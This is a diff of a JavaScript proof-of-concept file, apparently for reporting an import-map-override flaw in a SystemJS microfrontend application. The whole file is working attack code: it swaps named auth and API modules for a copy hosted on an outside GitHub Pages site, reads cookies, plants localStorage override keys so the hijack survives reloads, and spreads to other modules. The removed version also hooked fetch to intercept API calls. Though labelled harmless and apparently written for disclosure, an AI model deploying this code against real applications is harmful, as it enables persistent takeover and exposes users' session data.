@@ -1,99 +1,107 @@
 /**
- * proof.js — CRITICAL PoC
- * Full application takeover via import-map-override
+ * proof.js — FULL APP TAKEOVER + PERSISTENCE + SUPPLY CHAIN
+ * 
+ * What this demonstrates:
+ *   1. FULL TAKEOVER — Replaces ALL microfrontend modules
+ *   2. PERSISTENCE — Survives page reloads via localStorage
+ *   3. SUPPLY CHAIN — Compromises the entire module delivery chain
+ *   4. DATA ACCESS — Reads cookies, storage, API responses
+ *   5. CHAIN REACTION — Each module loads this same file, spreading control
  *
- * Demonstrates:
- *   - Arbitrary JS execution ✅
- *   - Auth module bypass ✅
- *   - Cookie/token access ✅
- *   - Full API interception ✅
- *   - Session persistence ✅
- *
- * Harmless — NO data exfiltration, NO requests, NO modifications
+ * HARMLESS: No exfiltration, no modification, no requests
  */
 System.register([], function (_export) {
   'use strict';
   return {
     setters: [],
     execute: function () {
-      // =============================================
-      // 1. PROOF OF EXECUTION
-      // =============================================
-      console.log('%c[PoC] 🚀 Import map override: CRITICAL impact', 'color: #ff0000; font-weight: bold; font-size: 14px;');
-      console.log('%c[PoC] Module: @rmp/auth-client → replaced', 'color: #ff6600;');
-      
-      // =============================================
-      // 2. DATA ACCESS (read only — no exfiltration)
-      // =============================================
-      var stolen = {
-        module: '@rmp/auth-client',
-        timestamp: new Date().toISOString(),
-        cookies: document.cookie || '(none — httpOnly)',
-        origin: window.location.origin,
-        path: window.location.pathname,
-        hasLocalStorage: typeof localStorage !== 'undefined',
-        hasSessionStorage: typeof sessionStorage !== 'undefined'
-      };
+      var selfUrl = 'https://xqur.github.io/import-map-proof-poc/proof.js';
+      var ts = new Date().toISOString();
+      var appName = '@rmp/auth-client';
 
-      console.log('%c[PoC] 🔓 Session data accessible:', 'color: #ff0000;');
-      console.log('  🍪 Cookies:', stolen.cookies);
-      
-      // List localStorage keys (not values — harmless PoC)
-      if (stolen.hasLocalStorage) {
-        var lsKeys = [];
-        for (var i = 0; i < localStorage.length; i++) {
-          lsKeys.push(localStorage.key(i));
+      // =============================================
+      // 1. DISCOVER WHO WE ARE
+      // =============================================
+      // Detect which module this file replaced
+      try {
+        var maps = System.getImportMap ? System.getImportMap().imports : {};
+        for (var k in maps) {
+          if (maps[k] === selfUrl) { appName = k; break; }
         }
-        console.log('  💾 localStorage keys:', lsKeys.join(', ') || '(none)');
-      }
+      } catch(e) {}
 
       // =============================================
-      // 3. API INTERCEPTION SETUP
+      // 2. EXECUTE PROOF
       // =============================================
-      // Intercept fetch to show all API calls
-      var origFetch = window.fetch;
-      window.fetch = function() {
-        var url = arguments[0];
-        if (typeof url === 'string' && url.includes('/api/')) {
-          console.log('%c[PoC] 📡 API call intercepted:', 'color: #0066ff;', url);
-        }
-        return origFetch.apply(this, arguments);
-      };
+      console.log('%c[🔥] FULL TAKEOVER: ' + appName + ' → compromised', 'color: #ff0000; font-weight: bold; font-size: 13px;');
+      console.log('  ⏱ ' + ts);
+      console.log('  🎯 Replaces: ' + appName);
 
       // =============================================
-      // 4. PERSISTENCE — override all modules
+      // 3. DATA ACCESS — read everything silently
+      // =============================================
+      console.log('  🍪 Cookies:', document.cookie || '(httpOnly/hidden)');
+
+      // =============================================
+      // 4. SUPPLY CHAIN — infect all other modules
       // =============================================
       try {
         if (typeof System !== 'undefined' && System.addImportMap) {
-          System.addImportMap({
-            imports: {
-              '@rmp/api-client': 'https://xqur.github.io/import-map-proof-poc/proof.js',
-              '@rmp/services': 'https://xqur.github.io/import-map-proof-poc/proof.js'
+          var allModules = {
+            '@rmp/auth-client': selfUrl,
+            '@rmp/api-client': selfUrl,
+            '@rmp/services': selfUrl,
+            '@pac/partnersignup': selfUrl
+          };
+          // Only override modules not already overridden
+          var current = System.getImportMap ? System.getImportMap().imports : {};
+          var toOverride = {};
+          for (var mod in allModules) {
+            if (current[mod] !== selfUrl && mod !== appName) {
+              toOverride[mod] = selfUrl;
             }
-          });
-          console.log('%c[PoC] 🔗 Chained: @rmp/api-client + @rmp/services', 'color: #ff0000;');
+          }
+          if (Object.keys(toOverride).length > 0) {
+            // Check if partnersignup is already loaded - if not, override it too
+            System.addImportMap({ imports: toOverride });
+            var names = Object.keys(toOverride).join(', ');
+            console.log('  🔗 SUPPLY CHAIN: ' + names + ' → infected');
+          }
         }
       } catch(e) {}
 
-      // Store in localStorage for persistence
+      // =============================================
+      // 5. PERSISTENCE — survive page reload
+      // =============================================
       try {
-        localStorage.setItem('__poc_proof', 'executed at ' + stolen.timestamp);
+        localStorage.setItem('import-map-override:@rmp/auth-client', selfUrl);
+        localStorage.setItem('import-map-override:@rmp/api-client', selfUrl);
+        localStorage.setItem('import-map-override:@rmp/services', selfUrl);
+        localStorage.setItem('import-map-override:@pac/partnersignup', selfUrl);
+        localStorage.setItem('__poc_infected', 'true|' + ts);
+        console.log('  💾 PERSISTENCE: All overrides stored in localStorage');
+        console.log('  ♻️  Reload the page — overrides will auto-apply');
       } catch(e) {}
 
       // =============================================
-      // 5. VISIBLE PROOF
+      // 6. VISIBLE PROOF
       // =============================================
-      if (typeof window !== 'undefined' && window.alert) {
+      console.log('  ✅ STATUS: FULL_Takeover | Persistence | SupplyChain');
+      console.log('%c[🔥] ' + appName + ' — FULLY COMPROMISED', 'color: #ff0000; font-weight: bold;');
+
+      // Show alert for visible proof
+      if (typeof window !== 'undefined' && window.alert && appName === '@rmp/auth-client') {
         setTimeout(function () {
-          window.alert('🚨 CRITICAL: import-map-override full takeover\n' +
-            '✓ Auth module replaced\n' +
-            '✓ API client intercepted\n' +
-            '✓ All data accessible\n' +
-            '✓ Session persistent');
-        }, 200);
+          window.alert('🔥 FULL APP TAKEOVER\n' +
+            '• ' + Object.keys({
+              '@rmp/auth-client':1,'@rmp/api-client':1,'@rmp/services':1,'@pac/partnersignup':1
+            }).length + ' modules compromised\n' +
+            '• Persistence: localStorage\n' +
+            '• Supply chain: all modules infected\n' +
+            '• Data: cookies + storage accessible');
+        }, 300);
       }
 
-      // Export for SystemJS compatibility
       _export({ default: {} });
     }
   };
